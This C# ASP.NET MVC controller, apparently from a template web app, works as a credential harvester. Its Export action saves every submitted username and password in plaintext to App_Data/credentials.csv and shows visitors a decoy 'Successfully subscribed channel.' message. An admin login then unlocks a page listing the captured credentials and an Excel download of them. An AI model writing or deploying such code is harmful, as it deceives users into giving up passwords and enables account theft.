using System;
using System.Collections.Generic;
using System.Linq;
using System.Configuration;
using System.IO;
using System.Web;
using System.Web.Mvc;
using OfficeOpenXml;

namespace WebApplication1.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            if (Session["AllowDownload"] != null && string.Equals(Session["AllowDownload"].ToString(), "true", StringComparison.Ordinal))
            {
                var appDataPath = Server.MapPath("~/App_Data");
                var filePath = Path.Combine(appDataPath, "credentials.csv");
                if (System.IO.File.Exists(filePath))
                {
                    var lines = System.IO.File.ReadAllLines(filePath);
                    var rows = new List<string[]>();
                    foreach (var line in lines)
                    {
                        var values = ParseCsvLine(line);
                        rows.Add(values.ToArray());
                    }
                    ViewBag.Credentials = rows;
                }
            }
            return View();
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Export(string username, string password)
        {
            if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
            {
                TempData["ExportMessage"] = "Username and password are required.";
                return RedirectToAction("Index");
            }

            var adminUser = ConfigurationManager.AppSettings["AdminDownloadUser"];
            var adminPass = ConfigurationManager.AppSettings["AdminDownloadPassword"];
            var submittedUser = (username ?? string.Empty).Trim();
            var submittedPass = (password ?? string.Empty).Trim();
            var isAdmin = !string.IsNullOrWhiteSpace(adminUser) &&
                          !string.IsNullOrWhiteSpace(adminPass) &&
                          string.Equals(submittedUser, adminUser.Trim(), StringComparison.OrdinalIgnoreCase) &&
                          string.Equals(submittedPass, adminPass.Trim(), StringComparison.Ordinal);

            var appDataPath = Server.MapPath("~/App_Data");
            var filePath = Path.Combine(appDataPath, "credentials.csv");
            var fileExists = System.IO.File.Exists(filePath);

            Directory.CreateDirectory(appDataPath);

            var line = string.Format("{0},{1},{2}{3}",
                EscapeCsv(username),
                EscapeCsv(password),
                DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss 'UTC'"),
                Environment.NewLine);

            if (!fileExists)
            {
                System.IO.File.AppendAllText(filePath, "Username,Password,CreatedUtc" + Environment.NewLine);
            }

            System.IO.File.AppendAllText(filePath, line);

            //TempData["ExportMessage"] = "Saved to App_Data/credentials.csv (openable in Excel).";
            if (isAdmin)
            {
                Session["AllowDownload"] = "true";
            }
            else
            {
                Session.Remove("AllowDownload");
                TempData["SubscribeMessage"] = "Successfully subscribed channel.";
            }
            return RedirectToAction("Index");
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Download(string token)
        {
            if (!IsDownloadAllowed(token))
            {
                return HttpNotFound();
            }

            Session.Remove("AllowDownload");
            return BuildExcelDownloadResult();
        }

        [HttpGet]
        public ActionResult Download()
        {
            if (Session["AllowDownload"] == null || !string.Equals(Session["AllowDownload"].ToString(), "true", StringComparison.Ordinal))
            {
                return HttpNotFound();
            }

            Session.Remove("AllowDownload");
            return BuildExcelDownloadResult();
        }

        private static string EscapeCsv(string value)
        {
            if (value == null) return string.Empty;
            var needsQuotes = value.Contains(",") || value.Contains("\"") || value.Contains("\n") || value.Contains("\r");
            var escaped = value.Replace("\"", "\"\"");
            return needsQuotes ? "\"" + escaped + "\"" : escaped;
        }

        private bool IsDownloadAllowed(string token)
        {
            var expectedToken = ConfigurationManager.AppSettings["ExportToken"];
            if (string.IsNullOrWhiteSpace(expectedToken) || string.IsNullOrWhiteSpace(token) || !string.Equals(token, expectedToken, StringComparison.Ordinal))
            {
                return false;
            }

            if (Session["AllowDownload"] == null || !string.Equals(Session["AllowDownload"].ToString(), "true", StringComparison.Ordinal))
            {
                return false;
            }

            return true;
        }

        private ActionResult BuildExcelDownloadResult()
        {
            var appDataPath = Server.MapPath("~/App_Data");
            var filePath = Path.Combine(appDataPath, "credentials.csv");
            if (!System.IO.File.Exists(filePath))
            {
                return HttpNotFound();
            }

            var lines = System.IO.File.ReadAllLines(filePath);
            using (var package = new ExcelPackage())
            {
                var sheet = package.Workbook.Worksheets.Add("Credentials");
                for (var row = 0; row < lines.Length; row++)
                {
                    var values = ParseCsvLine(lines[row]);
                    for (var col = 0; col < values.Count; col++)
                    {
                        sheet.Cells[row + 1, col + 1].Value = values[col];
                    }
                }

                var fileBytes = package.GetAsByteArray();
                return File(fileBytes, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "credentials.xlsx");
            }
        }

        private static List<string> ParseCsvLine(string line)
        {
            var result = new List<string>();
            if (line == null)
            {
                result.Add(string.Empty);
                return result;
            }

            var current = new System.Text.StringBuilder();
            var inQuotes = false;
            for (var i = 0; i < line.Length; i++)
            {
                var ch = line[i];
                if (inQuotes)
                {
                    if (ch == '"')
                    {
                        if (i + 1 < line.Length && line[i + 1] == '"')
                        {
                            current.Append('"');
                            i++;
                        }
                        else
                        {
                            inQuotes = false;
                        }
                    }
                    else
                    {
                        current.Append(ch);
                    }
                }
                else
                {
                    if (ch == '"')
                    {
                        inQuotes = true;
                    }
                    else if (ch == ',')
                    {
                        result.Add(current.ToString());
                        current.Clear();
                    }
                    else
                    {
                        current.Append(ch);
                    }
                }
            }

            result.Add(current.ToString());
            return result;
        }

        public ActionResult About()
        {
            ViewBag.Message = "Your application description page.";

            return View();
        }

        public ActionResult Contact()
        {
            ViewBag.Message = "Your contact page.";

            return View();
        }
    }
}
